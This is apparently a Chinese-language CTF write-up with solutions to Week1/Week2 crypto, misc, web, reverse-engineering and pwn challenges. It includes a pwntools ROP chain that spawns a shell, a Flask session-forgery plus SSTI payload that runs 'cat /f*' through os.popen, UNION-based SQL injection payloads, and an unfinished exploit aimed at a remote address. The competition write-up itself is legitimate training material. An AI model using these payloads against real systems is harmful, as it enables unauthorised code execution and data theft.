p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000402074) # syscall
r.send(p)
r.interactive()
```

# Crypto

## [Week1] EzAES

```Python
from Crypto.Cipher import AES

ciphertext = b'\xd9\x96\x12\xd2\xc8C\xf3\xda\x1b\xcc\x16:E\\y\xb0\xc0h\xeaZ\xa2\x94g\x12\xb9\x10\x1eM\x17\x7f\rt\xd9P\xc3\xaei#\xf1Iz\xb4\x00\x87\xe8\xb6\xe1\xc7'
iv = b"4 H\xba\x11'q\x9do\x0b\x95M\xa3\xc2;\x1b"
key = b'm?\xe4g\xed&\x15\x0f\xde\xf6\xdd\x0cc\xbf~\xa0'
aes = AES.new(key, AES.MODE_CBC, iv)

decrypted = aes.decrypt(ciphertext)
flag = decrypted.rstrip(b' ')
print(flag.decode('utf-8'))
```

## [Week1] Hello Crypto

```Python
from Crypto.Util.number import long_to_bytes

m = 215055650564999214440740846573763404964336902332280349562984743385314575382442402233747089392788438317622305039110504400765

flag = long_to_bytes(m)
print(flag)
```



# Misc

## [Week2]遮遮掩掩?CCRC!

zip包三字节，猜测为汉字，修改CRC32碰撞脚本

```Python
#!/usr/bin/python3.8
# -*- coding: utf-8 -*-
import requests
import zipfile
import binascii
import string
from natsort import natsorted  # 导入natsorted库




def ReadCRC(zipname):
    zip_url = "./" + zipname
    file_zip = zipfile.ZipFile(zip_url)  # 用zipfile读取指定的压缩包文件
    name_list = file_zip.namelist()  # 获取并存储压缩包内所有的文件名
    sorted_names = natsorted(name_list)  # 自然排序文件名
    crc_list = []
    crc32_list = []
    print('+--------------遍历指定压缩包的CRC值----------------+')

    for name in sorted_names:
        name_message = file_zip.getinfo(name)
        crc_list.append(name_message.CRC)
        crc32_list.append(hex(name_message.CRC))
        print('[OK] {0}: {1}'.format(name, hex(name_message.CRC)))

    print('+-------------对输出的CRC值进行汉字爆破-----------------+')
    comment = ''
    # 汉字范围，选择你想要的汉字

    chars = [chr(i) for i in range(0x4e00, 0x9fa5)]  # 汉字的 Unicode 范围
    for crc_value in crc_list:
        for char in chars:
            thicken_crc = binascii.crc32(char.encode('utf-8'))  # 获取汉字的CRC32值
            calc_crc = thicken_crc & 0xffffffff                 # 将CRC32值与0xffffffff进行与运算
            if calc_crc == crc_value:                           # 匹配两个CRC32值
                print('[+] {}: {}'.format(hex(crc_value), char))
                comment += char
                break  # 匹配后跳出循环

    print('+-----------------CRC爆破结束！！！-----------------+')
    crc32_list = str(crc32_list)
    crc32_list = crc32_list.replace('\'', '')
    print("读取成功，导出CRC列表为：" + crc32_list)  # 导出CRC列表
    print('CRC爆破成功，结果为: {}'.format(comment))  # 输出爆破结果


if __name__ == '__main__':
    zipname = str(input("请输入压缩包名字：\nReadZip >>> "))
    ReadCRC(zipname)
```

再使用熊曰解码可以得到flag

![image-20241031084520805](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031084520805.png)

## **[Week2]拜师之旅②**

图片包含多个IDAT块，发现其中一个IDAT块异常

![img](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/clip_image002.gif)

使用010editor打开，将trunk【1】-【4】全部删除，最后保存文件

![img](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/clip_image004.gif)

得到flag

![img](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/clip_image006.gif)

## [Week2]Schneider

找到施耐德工控工具，注册账号后下载

![image-20241031084827730](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031084827730.png)

使用工具打开即可

![image-20241031084842310](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031084842310.png)

# Web

## [Week2]guess_the_number

在源码看到提示

![image-20241031084858419](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031084858419.png)

下载附件得到源码:

```Python
import flask
import random
from flask import Flask, request, render_template, send_file

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', first_num = first_num)  

@app.route('/s0urce')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)
    
@app.route('/first')
def get_first_number():
    return str(first_num)
    
@app.route('/guess')
def verify_seed():
    num = request.args.get('num')
    if num == str(second_num):
        with open("/flag", "r") as file:
            return file.read()
    return "nonono"
 
def init():
    global seed, first_num, second_num
    seed = random.randint(1000000,9999999)
    random.seed(seed)
    first_num = random.randint(1000000000,9999999999)
    second_num = random.randint(1000000000,9999999999)

init()
app.run(debug=True)
```

可以根据first_num来反猜seed,构造脚本

```Python
import random

# 已知的first_num
known_first_num = 2346317842  # 这里填写实际的first_num值

# 遍历所有可能的seed值
for possible_seed in range(1000000, 10000000):
    random.seed(possible_seed)
    generated_first_num = random.randint(1000000000, 9999999999)
    if generated_first_num == known_first_num:
        print(f"Found seed: {possible_seed}")
        break
else:
    print("No matching seed found.")
```

得到seed为:4819039

![image-20241031084622556](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031084622556.png)

然后再构造脚本求得second_num

```Python
import random

# 已知的first_num
known_first_num = 2346317842

# 找到的seed值
found_seed = 4819039

# 使用找到的seed值初始化随机数生成器
random.seed(found_seed)

# 生成first_num和second_num
generated_first_num = random.randint(1000000000, 9999999999)
generated_second_num = random.randint(1000000000, 9999999999)

# 验证first_num是否正确
if generated_first_num == known_first_num:
    print(f"First number matched: {generated_first_num}")
    print(f"Predicted second number: {generated_second_num}")
else:
    print("Failed to match the first number.")
```

![image-20241031084633172](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031084633172.png)

输入即可得到flag

## [Week2]入侵者禁入

源代码：

```Python
from flask import Flask, session, request, render_template_string
app = Flask(__name__)
app.secret_key = '0day_joker'
@app.route('/')
def index():
    session['role'] = {
        'is_admin': 0,
        'flag': 'your_flag_here'
    }
    with open(__file__, 'r') as file:
        code = file.read()
    return code
@app.route('/admin')
def admin_handler():
    try:
        role = session.get('role')
        if not isinstance(role, dict):
            raise Exception
    except Exception:
        return 'Without you, you are an intruder!'
    if role.get('is_admin') == 1:
        flag = role.get('flag') or 'admin'
        message = "Oh,I believe in you! The flag is: %s" % flag
        return render_template_string(message)
    else:
        return "Error: You don't have the power!"
if __name__ == '__main__':
    app.run('0.0.0.0', port=80)
```

在admin路由下，如果数组role里的is_admin的值为1，则讲role放到render_template_string函数中并返回

`render_template_string()`存在ssti

role数组里有两个元素，is_admin需要为1，所以还可以利用flag的值来注入

即{'role':{'flag':'{{2*5}}','is_admin':1}}

先session伪造

密钥已经告诉我们了'0day_joker'

利用伪造session的脚本flask_session_cookie_manager3.py(网上一搜就可以找到)

命令：

python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role':{'flag':'{{2*5}}','is_admin':1}}"

得到sseion

![image-20241031084919136](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031084919136.png)

在/admin路由下传入

![image-20241031084937221](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031084937221.png)

回显了10，说明伪造成功了，而且确实是ssti

那么接下来改role数组中flag的值来ssti注入即可

最终命令

python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role':{'flag':'{{config.__class__.__init__.__globals__.os.popen(\x27cat /f*\x27).read()}}','is_admin':1}}"

![image-20241031084950084](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031084950084.png)

传入即可获得flag

## [Week2]自助查询

payload：

```Bash
1") order by 2
-1") union select database(),version()
-1") union select 2,group_concat(table_name) from information_schema.tables where table_schema='ctf'
-1") union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' and table_schema='ctf'
-1") union select 1,group_concat(id , scretdata) from flag;
提示在注释里面

-1") union select 1,column_comment from information_schema.columns where table_schema = 'ctf' and table_name = 'flag' and column_name = 'scretdata'; #
```

# Rev

## [Week2]babytea

```C++
#include <cstdio>
#include <cstring>

int *__fastcall tea_decrypt(unsigned int *a1, unsigned __int8 *key)
{
  int *result; // rax
  unsigned int sum; // [rsp+20h] [rbp-10h]
  unsigned int i; // [rsp+24h] [rbp-Ch]
  unsigned int v1; // [rsp+28h] [rbp-8h]
  unsigned int v0; // [rsp+2Ch] [rbp-4h]

  v0 = *a1;
  v1 = a1[1];
  sum = 0x8DDE2E40 + 0x61C88747 * 64;
  for (i = 0; i <= 63; ++i)
  {
    v0 += (((16 * v1) ^ (v1 >> 5)) + v1) ^ v1 ^ (*&key[4 * (sum & 3)] + sum);
    sum -= 0x61C88747;
    v1 += (((16 * v0) ^ (v0 >> 5)) + v0) ^ v0 ^ (*&key[4 * ((sum >> 11) & 3)] + sum);
  }
  *a1 = v0;
  a1[1] = v1;
printf("%c%c%c%c", 
    *((unsigned char*)&v0 + 0) & 0xff,
    *((unsigned char*)&v0 + 1) & 0xff, 
    *((unsigned char*)&v0 + 2) & 0xff, 
    *((unsigned char*)&v0 + 3) & 0xff);
  
printf("%c%c%c%c", 
    *((unsigned char*)&v1 + 0) & 0xff,
    *((unsigned char*)&v1 + 1) & 0xff, 
    *((unsigned char*)&v1 + 2) & 0xff, 
    *((unsigned char*)&v1 + 3) & 0xff);
  return result;
}

int main() {
  unsigned int v3[4] = {1, 1, 2, 3};
  unsigned int v1[10] = {0x18C2E339, 0xE9550982, 0x108A30F7, 0x18430DD, 0xD5DE57B0, 0xD43E0740, 0xF42FDDE4, 0x968886E8, 0xE5D77B79, 0x685D758F};
  unsigned int v2[10];

  for (int i = 0; i <= 9; i += 2) {
    v2[i] = v1[i];
    v2[i + 1] = v1[i + 1];
    tea_decrypt(&v2[i], (unsigned __int8 *)v3);
  }

  printf("Decrypted data:\n");
  for (int i = 0; i < 10; ++i) {
    printf("%08X", v2[i]);
  }
   return 0;
}
```

## [Week2]花语

把jz jnz跳转nop掉再将数据块重新转为代码重新编译即可看到正确逻辑

```C++
def swap_pairs(flag):
    # 第一步：前 29 个字符，两两交换
    for i in range(0, 29, 2):
        flag[i], flag[i + 1] = flag[i + 1], flag[i]
    return flag


def reverse_pairs(flag):
    # 第二步：对前半部分和后半部分的字符交换
    v17 = 0
    while v17 < 14:
        flag[v17], flag[29 - v17] = flag[29 - v17], flag[v17]
        v17 += 1
    return flag


def decrypt_flag():
    # 已知字节数组
    byte_ACCDE8 = [
        0x21, 0x7D, 0x67, 0x67, 0x61, 0x67, 0x6C, 0x6C, 0x6C, 0x6C,
        0x66, 0x66, 0x5F, 0x66, 0x61, 0x75, 0x5F, 0x68, 0x69, 0x73,
        0x59, 0x5F, 0x6B, 0x65, 0x46, 0x7B, 0x43, 0x54, 0x53, 0x48
    ]

    # 将字节数组转换为字符串
    flag = [chr(byte) for byte in byte_ACCDE8]

    # 进行两次操作：swap_pairs 和 reverse_pairs
    flag = swap_pairs(flag)
    flag = reverse_pairs(flag)

    # 输出最终的 flag
    decrypted_flag = ''.join(flag)
    return decrypted_flag


result = decrypt_flag()
print(result)
```

## [Week2]cancanneed

读取本地文件xxnd图片数据，从2080开始读取16字节作为key进行AES解密

```Python
def read_bytes_after_skip(file_path, skip_bytes, read_length):
    try:
        with open(file_path, "rb") as file:
            file.seek(skip_bytes)
            data = file.read(read_length)
            print("读取的字节:", data.hex())
            return data
    except FileNotFoundError:
        print("文件未找到:", file_path)
    except IOError as e:
        print("文件读取失败:", e)

file_path = "./xxnd.jpg"
skip_bytes = 2080
read_length = 16

read_bytes_after_skip(file_path, skip_bytes, read_length)
from Crypto.Cipher import AES
import base64
import binascii

def aes_ecb_pkcs5_decrypt(key, ciphertext):
    key_bytes = binascii.unhexlify(key)
    ciphertext_bytes = base64.b64decode(ciphertext)
    cipher = AES.new(key_bytes, AES.MODE_ECB)
    decrypted_bytes = cipher.decrypt(ciphertext_bytes)
    padding_length = decrypted_bytes[-1]
    plaintext_bytes = decrypted_bytes[:-padding_length]

    return plaintext_bytes

key = "02d7dd3fa96e3fcc89407d9116d8ad50"
ciphertext = "7zkErqD/oevxjIIjgJswFk3+vDgw5tvK3Cgr/GIYeZEQ5Gq/6v9LPTiUswKcx5ha"

plaintext_bytes = aes_ecb_pkcs5_decrypt(key, ciphertext)

plaintext = plaintext_bytes.decode("utf-8", errors="ignore")
print(plaintext)
```

## [Week2]Loader

enc解密后是dex文件，直接equal的直接调用函数即可得到flag

```JavaScript
function hook1() {
    Java.perform(function () {
        let MainActivity = Java.use("com.android.loader.MainActivity");
MainActivity["GetData"].implementation = function (context) {
    console.log('GetData is called' + ', ' + 'context: ' + context);
    let ret = this.GetData(context);
    console.log('GetData ret value is ' + ret);
    return ret;
};
    })
}

function hook2(){
        Java.perform(function () {
            Java.enumerateClassLoaders({
                onMatch: function (loader) {
                    try {
                        var factory = Java.ClassFactory.get(loader);
                        var CheckerClass = factory.use("com.android.loader.GetFlag");
                        var flag = CheckerClass.generateRandomString(4310,12);
                        console.log("Flag: " + flag);
    
                    } catch (e) {
                       // console.log("Error accessing class or method: " + e);
                    }
                },
                onComplete: function () {
                }
            });
    
        });
}

function main(){
    hook1();
    hook2();
}
setTimeout(main,300)
```

## [Week2]Android？Harmony！

使用魔改jadx对module.abc进行反编译

![image-20241031085011746](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031085011746.png)

![image-20241031085021475](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031085021475.png)

对这段代码进行解密得到

b4c4S20331H3cf208Cb9Tbebc2a83a1a6d4F96b45-8942-8{e55503d5c-1abe-18d99d75fd7e4463978a1a1b2995093d6db9cf922b-332642719-16451c451c512da4ae516a618-f5bf4dc1e10}8844d18-d5dae11b-b5d4da4736fc

```Python
def decrypt_char(encrypted_char):
    val = ord(encrypted_char) - 32
    for i in range(95):
        if (((114514 * i) + 1919810) % 95) == val:
            original_val = i + 32
            return chr(original_val)
    return '?'


def decrypt_string(encrypted_string):
    decrypted_string = ""
    for char in encrypted_string:
        decrypted_string += decrypt_char(char)
    return decrypted_string


data = "[f#fLw)??Pz?#9w)Du[ks[q[#w4D?4P4UJf,kU[f.rDkfwrDtq...)?J.#rP4[qrPDJkkJ|.9J|qffU?k|D4P4P[wkk.)k?JUJ[k#9kww[r??wUfw|PkrPUf.P#f.P#.PwJ4f4q.PU4UPDr9.[9fJ#PqP)cDDffJPDrJ.J4qPP[r[.JfJ4f|?U9#"

de_data = decrypt_string(data)
print(de_data)
```

![image-20241031085040920](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031085040920.png)

使用bfs将迷宫路径输出

```Python
maze = [
    ["#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#",
     "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#",
     "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#",
     "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#"],
    ["#", " ", "#", " ", " ", " ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", "#", " ", " ", " ", " ",
     " ", " ", " ", "#", " ", " ", " ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ",
     " ", " ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", "#", " ", " ", " ", "#", " ", " ", " ", "#", " ", " ",
     " ", "#", " ", " ", " ", "#", " ", " ", " ", " ", " ", " ", " ", " ", " ", "#"],
     
    .........


    ["#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#",
     "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#",
     "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#",
     "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#", "#"],

]

rows = len(maze)
cols = len(maze[0]) if maze else 0
print(f"迷宫的行数为：{rows}，列数为：{cols}")

# 起点和终点
start = (1, 83)
end = (77, 1)

# 定义四个方向和对应的字符
directions = [(-1, 0), (1, 0), (0, -1), (0, 1)]
dir_chars = ['w', 's', 'a', 'd']

from collections import deque

def bfs(maze, start, end):
    n = len(maze)
    m = len(maze[0])
    queue = deque()
    queue.append(start)
    visited = [[False]*m for _ in range(n)]
    prev = [[None]*m for _ in range(n)]
    visited[start[0]][start[1]] = True

    while queue:
        x, y = queue.popleft()
        if (x, y) == end:
            break
        for i, (dx, dy) in enumerate(directions):
            nx, ny = x + dx, y + dy
            if 0 <= nx < n and 0 <= ny < m and maze[nx][ny] == " " and not visited[nx][ny]:
                queue.append((nx, ny))
                visited[nx][ny] = True
                prev[nx][ny] = (x, y, dir_chars[i])

    if not visited[end[0]][end[1]]:
        return None  # 无路径可达

    # 重建路径
    path = []
    x, y = end
    while (x, y) != start:
        x_prev, y_prev, move = prev[x][y]
        path.append(move)
        x, y = x_prev, y_prev
    path.reverse()
    return ''.join(path)

def dfs(maze, start, end):
    n = len(maze)
    m = len(maze[0])
    stack = [(start, [])]
    visited = [[False]*m for _ in range(n)]
    visited[start[0]][start[1]] = True

    while stack:
        (x, y), path = stack.pop()
        if (x, y) == end:
            return ''.join(path)
        for i, (dx, dy) in enumerate(directions):
            nx, ny = x + dx, y + dy
            if 0 <= nx < n and 0 <= ny < m and maze[nx][ny] == " " and not visited[nx][ny]:
                visited[nx][ny] = True
                stack.append(((nx, ny), path + [dir_chars[i]]))
    return None  # 无路径可达

# 调用BFS算法
optimal_path_bfs = bfs(maze, start, end)

if optimal_path_bfs:
    print("使用BFS算法找到的最优路径为：", optimal_path_bfs)
else:
    print("Unreachable.")

# 调用DFS算法（可选）
optimal_path_dfs = dfs(maze, start, end)

if optimal_path_dfs:
    print("使用DFS算法找到的路径为：", optimal_path_dfs)
else:
    print("Unreachable.")
```

使用鸿蒙NEXT模拟器安装软件将密钥输入

![image-20241031085231780](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031085231780.png)

![image-20241031085108365](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031085108365.png)

在手机文件夹下找到输出的文件

![image-20241031085254487](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031085254487.png)

将文件的数据提取出来，使用bfs跑出的路径将途径的字符输出

```Python
# 定义迷宫
maze = [

    "#####################################################################################",
    "# #     #         #       #  b  #                 #       #   #   #   #   #        *#",
    "# # ### # ######### ##### # # ### ############### # ##### ### # # # # ### # ####### #",
    "# #4  # # #   #   #     # # #    c#               #   # #   #  4#   #     # #   #  S#",
    "# # # # # # # # # ####### # ##### # ################# # ### ### ########### # ### # #",
    "# # # # # # #   # #       # #     #       #     #     #   #   # #  2  #     # #   # #",
    "# # ### # # ##### # ####### # ########### # ### # ####### ### # ### # # ##### # #####",
    "#  0#   # # #    3  #     # # #         #   # #  3  #   #   # #     #1  #   #  H    #",
    "### # ### # # ####### ### # # # ############# ##### # # ### # ####### ### ######### #",
    "#   #3  #   #     #   #  c  # #    f  #      2#  0  # #8  #   #     #   #  C        #",
    "# ### # ######### # ### ##### ##### ### ##### ### ### # ####### ### ### ### #########",
    "# #   # #    b    # #   #   # #   #     #  9  #   #   # #   #   # # # # #  T  # #   #",
    "# # ##### ### ##### # ##### # # # ######### ### ####### # # # ### # # # # ### # # # #",
    "# # #    b  # #   # # #   #   # #  e    #   # #        b# # # #  c# #   # #   # # # #",
    "### # ####### # ### ### # ##### ### ##### ### ######### # # ### # # ##### ##### # ###",
    "#   #   #   # #2   a 8  #       #  3#    a# # #       #   # #   # #     #     # #   #",
    "# ##### # # # # ##### ########### # # ### # # # ##### ##### # ### ##### ##### # ### #",
    "#     # # # # # #  1  #     #  a  # # #   #  6# #   # #   #  d  #  4  #   # #F  # # #",
    "##### # # # # # ### ### ### ### ### ### ##### # # # # # ####### ### ##### # # ### # #",
    "#     #   # # # #   # # # #9  # # #     #     # # #   # #   # #   #   # # # # #  6# #",
    "# ######### # # # ### # # # # # # ####### ##### # ##### # # # ### ### # # # # # # # #",
    "#b          #   #4  #5  #   # #  -#  8  #9 4    # #     # # # #   #   #2 - 8 {  # # #",
    "# ############### ### ########### # # # # # ##### # ##### # # # ### ### ### ##### # #",
    "# #  e  #   #   #     #  5      # # # # # # #   #   #     #  5#5  #   #   #   #   # #",
    "# ### # # # # # ####### # ##### ### # # ### # # ##### ####### # # ### ### ### # ### #",
    "# #   # # #   # #     # # #   # #   # #     # # # #  0#       # #   # #   # # #   # #",
    "# # ### # ##### # ### # ### # # # ########### # # # # # ####### ##### # ### # ### # #",
    "# # #   #     #3  # #d  #   #   #     #     # #  5  # #  c    #   #   # #   # # # # #",
    "# ### ####### # ### # ### ########### # ### # ####### ### ####### # ### # ### # # # #",
    "#    -#       # # #   #   #   # #     # #   #  1    # #   #   #   #a  # #   # # #   #",
    "##### # ####### # ######### # # # ##### # ##### ##### # ### # # ### ### ### # # #####",
    "# #   #   #     #  b  #   # #  e#-    # #       #   # # # # # # # # #   # #  1#8    #",
    "# # ##### # ####### # # # # ### # ##### ######### # ### # # ### # # # ### ### # ### #",
    "# # #     # #     # #   # #   #d 9  #   #   #     # #   #9 d  #  7#   #  5#  f# # # #",
    "# # # ##### # ### # ######### # ##### ##### # ##### # ### ### ### ####### # # # # # #",
    "#  d# #   #   #  7# #    e    #     #     #   #    4  #  4  # #   #      6  # # #   #",
    "### # # ######### # ##### ######### ##### ############# ### ### ### ########### #####",
    "#   #3  #       # # #   #     #     #     # #       #   # #   # #   #   #      9    #",
    "# ### ### ##### # # # # ####### ##### ##### # ##### # ### ### # # ### # ########### #",
    "#7  # #  8  #   #   # # # #   #     #   #  a  #   #   #  1# #   #     #a      #   # #",
    "# # # ##### # ####### # # # # ##### ### # ####### ##### # # ########### ##### # ### #",
    "# #   #    1# # #   # # # # #       # # #       #   #   #  b#     #   # #   #   #   #",
    "# ##### ### # # # # ### # # ######### # ####### ### # ##### # ##### # # # ####### ###",
    "#     #   # # # # # #  2  #   #       #   #   #    9#   # #   #   # #   #     # #9  #",
    "##### ##### # # # # # ####### # ######### # # ##### ### # ##### # # ######### # # # #",
    "#     #     #5  # #   #   #  0  #   #   #   # #   #  9  # #    3# #  d  #    6#d  # #",
    "# ##### ##### ### ##### # # ##### # # ####### # ##### ### # ### # ### ### ### # #####",
    "# # #   #   # # # #   # # #   #   # # #   # #b  #   #   #   #  9#   #   # #   #c    #",
    "# # # ##### # # # # # ### ### # ### # # # # # ### # ### ##### # ### ### # # ### ### #",
    "# # # #  f  # # # # #   #    9# #   #2  #  2 b    #     #   # #   #   #   #   # #   #",
    "# # # # # ### # # # ### ##### ### ### ##################### # ### ########### # # ###",
    "#   # # #   #-  #  3  #3 2  #   #     #     #         # #  6  # #     #   #   # #   #",
    "##### # ### # ####### # # ##### ####### ### # ####### # # ##### ##### # ### ### ### #",
    "#    4# #  2  #       # # #   #7  #     # # #       #  1#     # #   #9 -#   #   # # #",
    "# ### # ### ### ####### ### # # # # ##### # ####### ### ##### # # # # # # ####### # #",
    "#   # #   #     #     #1    #  6# # #   #  4    #  5# #   # #1  # #   # #     #  c  #",
    "### # ### ####### ##### ####### # # # # ######### # # ### # # ### ##### ##### # #####",
    "#   #   # #     #     # #       # #4  # #   #     # # #   #   # #   #  5      #     #",
    "######### # ### ##### # # ######### ##### # # ####### # ####### ### ############### #",
    "#   #   # # # # #  1  # # # #     #  c  # #  5 1      # #   #  2#  d         a      #",
    "# # # # # # # # ### ### # # # ### ### # # ##### ####### # # ### ############# #######",
    "# # # #   #   #4  # #   #a e# # # #   #   #   #       #   #5   1  #   #       #     #",
    "# # # ######### # # # ### # # # # ######### # ####### ##### ##### # ### ####### ### #",
    "# # #   #   #   #  6  #   # # # #     #   # # #  a    #   #   #   #   #6    #   #   #",
    "# # ### ### ########### ### # # ##### # ### # # # ##### ##### ####### # ### # ### ###",
    "# #1  #   #     #     # # # #  8    # #   # #   #     # #     #     #   #  -  # #   #",
    "# # # ### ##### # ### # # # ######### ### # ######### # # ##### ### ##### ##### ### #",
    "# # # #   #    f 5#   #   #         #    b  #   #     # #f    # #   #   #     #    4#",
    "# # ### ### ##### # ############### ##### ### # # ##### # ### ### ### ####### ##### #",
    "# #     # # #     # #   #          d  #  c  # # # #   # #   #1  # #  e#   #   #  1  #",
    "# ####### # # ##### # ### ############# ### # ### # # # ##### # # # # # # # ### # ###",
    "#   #   #  0# #   # #   # #   #   #     #   #     # # # #     #   # #   # # #   #   #",
    "### ### ### # # # # ### # # ### # # ##### ########### # # ######### ##### ### ##### #",
    "#  }  #     # # #   #   #  8   8# # #   #    4  #   # # #4  #   #   # #   #   # #  d#",
    "##### ####### ####### ######### # # # ####### ### # # # # ### # # ### # ### ### # # #",
    "#   # #     #    1  #  8  #     #-  #        d  # #  5#   #   #   #  d#a    #   # # #",
    "# # # # ### ##### # ### # # ##### ########### # ##### ##### ####### # # ##### ### ###",
    "#@#   # # # #  e  #   # #  1  #  1    #   #   #   #  b -    #  b    # # #    5  #d  #",
    "# ##### # # ### ##### # ### # # ##### # # ####### # ### ##### # ##### # ####### # # #",
    "# #    4#   #   #   # # #   # # #   # # # #     # #d  # #     # # #   #   #    a# # #",
    "# ##### ##### ### # # # # ##### # # # ### # ##### # # # # ##### # # ##### # ### # ###",
    "#  4   7  #  3# # #   # # #    6  # #     #       # # # # #   # #   #  f  # # # #c  #",
    "### ####### # # # ##### # # ####### ################# # ##### # ##### # ### # # # # #",
    "#   #       #   #       # #       #                   #       #       #   #   #   # #",
    "#####################################################################################",

]

# 定义最优路径
optimal_path = "ssaassaassddddssaaaaaaaassaassssddddssssssaassddssssssssssaassaaaaaaaassaassddddwwddssssssaawwaassssddssddssddwwwwddddssaassddssaassaassddddssaaaaaawwwwaassaawwaassssddssddddddddddssaaaaaassddddssddwwddwwddddssaassddssssaaaassaassaassaaaawwddwwwwaassaawwaassssaassaawwaassaassaaaaaaaassddssssaaaaaaaaaaaaaaaaaawwwwaassaawwwwddwwwwwwaassaaaaaawwwwddddddddddwwaaaaaaaawwwwwwaawwwwddddddwwaawwaassaaaawwwwwwaawwaassssddssaaaaaassaaaawwwwaawwaassssssddssssssaawwaassssddssddssaassaaaawwwwwwwwwwaassssssssssssddssddssssaawwaass"

# 初始化起点和终点
start = (0, 0)
end = (0, 0)

# 找到起点和终点
for i, row in enumerate(maze):
    if '*' in row:
        start = (i, row.index('*'))
    if '@' in row:
        end = (i, row.index('@'))

# 按最优路径提取经过的字符
path_characters = []
current_pos = start

# 处理路径
for move in optimal_path:
    if move == 's':  # down
        current_pos = (current_pos[0] + 1, current_pos[1])
    elif move == 'w':  # up
        current_pos = (current_pos[0] - 1, current_pos[1])
    elif move == 'a':  # left
        current_pos = (current_pos[0], current_pos[1] - 1)
    elif move == 'd':  # right
        current_pos = (current_pos[0], current_pos[1] + 1)

    # 确保在边界内
    if 0 <= current_pos[0] < len(maze) and 0 <= current_pos[1] < len(maze[0]):
        if(maze[current_pos[0]][current_pos[1]] != ' '):
            path_characters.append(maze[current_pos[0]][current_pos[1]])

# 输出经过的字符
print("经过的字符:", ''.join(path_characters))
```

原本的逆向思路是bfs跑出的路径经过checkground后经过FillFlag填入迷宫中，但是checkground的逻辑一直不能还原实现，所以找到了鸿蒙NEXT模拟器跑一下程序，用程序自己将flag填入迷宫再使用跑出的最优路径输出最终的flag

# Pwn

## [Week2]json_printf

```Python
from pwn import *
from struct import pack
from ctypes import *
#from LibcSearcher import *
import base64
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
slc = lambda: asm(shellcraft.sh())
uu64 = lambda x: u64(x.ljust(8, b'\0'))
uu32 = lambda x: u32(x.ljust(4, b'\0'))
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))
def pre():
        print(p.recv())
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)
#context(log_level='debug',arch='amd64', os='linux')
context(log_level='debug',arch='i386', os='linux')
#p = process('./json_printf')
p = remote('210.44.150.15',41500)
elf = ELF('./json_printf')
#libc = ELF('./libc.so.6')
#gdb.attach(p, 'b *0x804948F')
#gdb.attach(p,'b *$rebase(0x19E8)')  #'b *$rebase(0x123456)'
#context(arch='amd64', os='linux')

#exp
